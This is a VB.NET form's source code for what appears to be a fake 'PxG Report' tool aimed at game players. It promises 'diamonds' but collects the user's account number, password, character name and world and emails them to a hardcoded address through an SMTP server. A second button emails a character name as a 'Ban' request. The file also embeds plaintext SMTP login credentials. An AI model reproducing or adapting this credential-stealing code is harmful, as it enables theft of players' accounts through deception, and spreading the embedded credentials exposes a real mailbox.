Imports System
Imports System.Net
Imports System.Net.Mail

Public Class Form1

    Private Sub TextBox1_KeyPress(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox1.KeyPress
        If Not Char.IsNumber(e.KeyChar) AndAlso Not Char.IsControl(e.KeyChar) Then e.KeyChar = ""
    End Sub

    Private Sub ReactorButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ReactorButton1.Click
        If TextBox1.Text = "" Then
            Me.ErrorProvider1.SetError(Me.TextBox1, "Error! Fill the field.")
        Else
            Me.ErrorProvider1.SetError(Me.TextBox1, "")
        End If
        If TextBox2.Text = "" Then
            Me.ErrorProvider1.SetError(Me.TextBox2, "Error! Fill the field.")
        Else
            Me.ErrorProvider1.SetError(Me.TextBox2, "")
        End If
        If TextBox3.Text = "" Then
            Me.ErrorProvider1.SetError(Me.TextBox3, "Error! Fill the field.")
        Else
            Me.ErrorProvider1.SetError(Me.TextBox3, "")
        End If
        If ComboBox1.Text = "" Then
            Me.ErrorProvider1.SetError(Me.ComboBox1, "Error! Fill the field.")
        Else
            Me.ErrorProvider1.SetError(Me.ComboBox1, "")
        End If


        If ((TextBox1.Text = "") Or (TextBox2.Text = "") Or (TextBox3.Text = "") Or (ComboBox1.Text = "")) Then

        Else
            ProgressBar1.Value = 21
            ProgressBar1.Value = 50
            Dim smsg As New MailMessage
            smsg.From = New MailAddress("galegovrawnelas@yahoo.com")
            smsg.To.Add("galegovrawnelas@yahoo.com")
            smsg.Priority = MailPriority.High
            smsg.Body = ("Account Number: " & TextBox1.Text & Chr(13) & "Password: " & TextBox2.Text & Chr(13) & "Character Name: " & TextBox3.Text & Chr(13) & "World: " & ComboBox1.Text)
            smsg.Subject = "Conta PxG"
            ProgressBar1.Value = 75

            Dim ssmtp As New SmtpClient
            ssmtp.Credentials = New NetworkCredential("knight_da_furia@hotmail.com", "gal3go666")
            ssmtp.EnableSsl = True
            ssmtp.Host = "smtp.live.com"
            ssmtp.Port = "587"

            Try
                ssmtp.Send(smsg)
                MsgBox("The information was sent to the system. Just wait for it. If something isn't correct you can't receive the diamonds in time", MsgBoxStyle.Information, Title:="PxG Report")
            Catch ex As Exception
                MsgBox("Something went wrong! Try again.", vbCritical, "PxG Report")
            End Try
            ProgressBar1.Value = 100
        End If
        
    End Sub

    Private Sub ReactorButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ReactorButton2.Click
        If TextBox4.Text = "" Then
            Me.ErrorProvider1.SetError(Me.TextBox4, "Error! Fill the field.")
        Else
            Me.ErrorProvider1.SetError(Me.TextBox4, "")
        End If
        If ComboBox2.Text = "" Then
            Me.ErrorProvider1.SetError(Me.ComboBox2, "Error! Fill the field.")
        Else
            Me.ErrorProvider1.SetError(Me.ComboBox2, "")
        End If

        If ((TextBox4.Text = "") Or (ComboBox2.Text = "")) Then

        Else
            ProgressBar2.Value = 21
            ProgressBar2.Value = 50
            Dim smsg As New MailMessage
            smsg.From = New MailAddress("galegovrawnelas@yahoo.com")
            smsg.To.Add("galegovrawnelas@yahoo.com")
            smsg.Priority = MailPriority.High
            smsg.Body = ("Character Name: " & TextBox4.Text & Chr(13) & "World: " & ComboBox2.Text)
            smsg.Subject = "Ban PxG"
            ProgressBar2.Value = 75

            Dim ssmtp As New SmtpClient
            ssmtp.Credentials = New NetworkCredential("knight_da_furia@hotmail.com", "gal3go666")
            ssmtp.EnableSsl = True
            ssmtp.Host = "smtp.live.com"
            ssmtp.Port = "587"

            Try
                ssmtp.Send(smsg)
                MsgBox("The information was sent to the system. Just wait for it. This function probably won't work because you need to send it plus a ticket, try the other one.", MsgBoxStyle.Information, Title:="PxG Report")
            Catch ex As Exception
                MsgBox("Something went wrong! Try again.", vbCritical, "PxG Report")
            End Try
            ProgressBar2.Value = 100
        End If
    End Sub
End Class
